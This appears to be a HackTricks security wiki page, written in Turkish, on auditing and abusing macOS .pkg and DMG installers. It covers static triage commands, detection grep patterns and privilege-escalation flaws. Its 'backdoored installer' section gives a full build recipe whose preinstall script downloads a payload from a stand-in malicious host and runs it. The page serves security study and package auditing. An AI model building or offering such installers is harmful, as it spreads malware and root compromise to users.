# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Bir macOS **installer package** (aynı zamanda `.pkg` file olarak da bilinir), macOS tarafından **software dağıtmak** için kullanılan bir file formatıdır. Bu files, bir software parçasının doğru şekilde install edilip çalışması için ihtiyaç duyduğu her şeyi içeren bir **box** gibidir.

Package file'ın kendisi, **target** computer üzerine install edilecek **files ve directories hiyerarşisini** barındıran bir archive'dır. Ayrıca installation öncesinde ve sonrasında tasks gerçekleştirmek için **scripts** içerebilir; örneğin configuration files oluşturmak veya software'ın eski versions'larını temizlemek gibi.

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) ve script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, çalıştırılacak scripts'lerin paths'leri
- **Bill of materials (bom)**: File permissions ile birlikte install, update veya remove edilecek files listesi
- **Payload (CPIO archive gzip compressed)**: PackageInfo içindeki `install-location` konumuna install edilecek files
- **Scripts (CPIO archive gzip compressed)**: Execution için temp directory'ye extract edilen pre ve post install scripts ile diğer resources.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Yükleyicinin içeriğini manuel olarak decompress etmeden görüntülemek için ücretsiz [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) aracını da kullanabilirsiniz.

### Static triage kısayolları

Amaç analiz yapmaksa paketi önce `Installer.app` ile açmaktan **kaçınmaya** çalışın. Bazı paketler, Installer onları açar açmaz kod çalıştırabilir (örneğin `system.run()` veya installer plug-in'leri aracılığıyla); bu nedenle offline extraction genellikle daha güvenli bir başlangıçtır.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Temel Bilgiler

DMG dosyaları veya Apple Disk Images, Apple'ın macOS işletim sistemi tarafından disk image'ları için kullanılan bir dosya formatıdır. DMG dosyası temel olarak, genellikle sıkıştırılmış ve bazen şifrelenmiş ham blok verilerini içeren **mount edilebilir bir disk image**'ıdır (kendi filesystem'ını içerir). Bir DMG dosyasını açtığınızda macOS onu **fiziksel bir diskmiş gibi mount eder** ve içeriğine erişmenizi sağlar.

> [!CAUTION]
> **`.dmg`** installer'larının **çok fazla formatı** desteklediğini ve geçmişte vulnerability içeren bazılarının **kernel code execution** elde etmek için abuse edildiğini unutmayın.

### Disk Image Yapısı

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Bir DMG dosyasının hiyerarşisi içeriğine göre farklı olabilir. Ancak application DMG'leri genellikle şu yapıyı izler:

- Top Level: Bu, disk image'ın root'udur. Genellikle application'ı ve muhtemelen Applications folder'ına bir link'i içerir.
- Application (.app): Bu, gerçek application'dır. macOS'ta bir application genellikle application'ı oluşturan birçok ayrı dosya ve folder içeren bir package'tır.
- Applications Link: Bu, macOS'taki Applications folder'ına bir shortcut'tır. Bunun amacı application'ı install etmenizi kolaylaştırmaktır. .app dosyasını application'ı install etmek için bu shortcut'a sürükleyebilirsiniz.

## pkg abuse ile Privesc

### Public directory'lerden execution

Bir pre- veya post-installation script'i **`/var/tmp/Installerutil`** gibi bir file'ı execute ederse ve bir attacker bu file'ı replace edebilirse, installer onu invoke ettiğinde attacker privilege escalation gerçekleştirebilir. Atıfta bulunulan konuşmalar ve walkthrough, bu insecure external-script pattern'inin varyantlarını göstermektedir.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Bu, çeşitli installer ve updater'ların **root olarak bir şey execute etmek** için çağırdığı [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)'dır. Bu function, execute edilecek **file**'ın **path**'ini parameter olarak kabul eder; ancak bir attacker bu file'ı **modify** edebilirse, execute işlemini root yetkileriyle **abuse ederek privilege escalation** gerçekleştirebilir.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Daha fazla bilgi için şu konuşmaya göz atın: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment ve shebang abuse

Modern PackageKit bug'ları, installer script'lerinin çoğu zaman **trusted root code** olarak yürütülürken saldırganın kontrol ettiği context'i yakında tutmaya devam ettiğini gösterdi. Vendor package'lerini denetlerken özellikle şunlara dikkat edin:

- `#!/bin/zsh` / `#!/bin/bash` gibi Shell interpreter'ları
- `sudo -u $USER`, `launchctl asuser` gibi çağrılar veya `$USER`, `$HOME`, `PATH`, `TMPDIR` ya da relative path'lere güvenen herhangi bir logic
- Kullanıcının kontrol ettiği init file'larını veya library'leri yükleyebilen non-shell interpreter'lar
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug'ı (`~/.zshenv` / `~/.bash*` kullanıcı tarafından başlatılan install işlemleri sırasında miras alındığında) için [generic macOS privesc page](../macos-privilege-escalation.md) sayfasına bakın. Paket **Apple-signed** ise aynı script bug'ı **SIP/TCC-relevant** hale gelebilir; çünkü `system_installd`, `com.apple.rootless.install.heritable` yetkisini taşıyabilir. [SIP page](../macos-security-protections/macos-sip.md) sayfasına bakın.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Mount kullanarak execution

Bir installer `/tmp/fixedname/bla/bla` konumuna yazıyorsa, `/tmp/fixedname` üzerine noowners ile bir **mount oluşturmak** ve böylece **installation sırasında herhangi bir dosyayı değiştirmek** mümkün olabilir; bu da installation process'i abuse etmek için kullanılabilir.

Buna örnek olarak, **root olarak execution elde etmek** amacıyla **periodic script'in üzerine yazmayı** başaran **CVE-2021-26089** verilebilir. Daha fazla bilgi için şu konuşmaya bakın: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## malware olarak pkg

### Boş Payload

İçinde script'lerin barındırdığı malware dışında gerçek bir payload olmadan, yalnızca **pre ve post-install script'leri** içeren bir **`.pkg`** dosyası oluşturmak mümkündür.<sup>[[2]](#references)</sup>

### Distribution xml içinde JS

Paketin **distribution xml** dosyasına **`<script>`** tag'leri eklemek mümkündür; bu kod execution edilir ve **`system.run`** kullanarak **commands execute edebilir**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages'te bu işlem genellikle, örneğin `allow-external-scripts="true"` ile top-level `Distribution` file'ın external scripts'i etkinleştirmesine bağlıdır. Bu nedenle yalnızca `preinstall` / `postinstall` incelemesi yeterli değildir: **Distribution XML'in kendisi** `installation-check` / `volume-check` hook'larını ve doğrudan `system.run()` / `system.runOnce()` execution path'lerini içerebilir.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoor'lu Installer

dist.xml içinde script ve JS code kullanan kötü amaçlı installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkg'leri Açma: macOS Installer Packages'a İçeriden Bakış ve Yaygın Güvenlik Açıkları](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installer'larının Vahşi Dünyası" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkg'leri Açma: macOS Installer Packages'a İçeriden Bakış](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages'larını Exploit Etme](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages ile SIP'i Kırma](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Bug'lar Dağı" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS'ta 1000 Installer Nedeniyle Ölüm ve Her Şey Bozuk!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
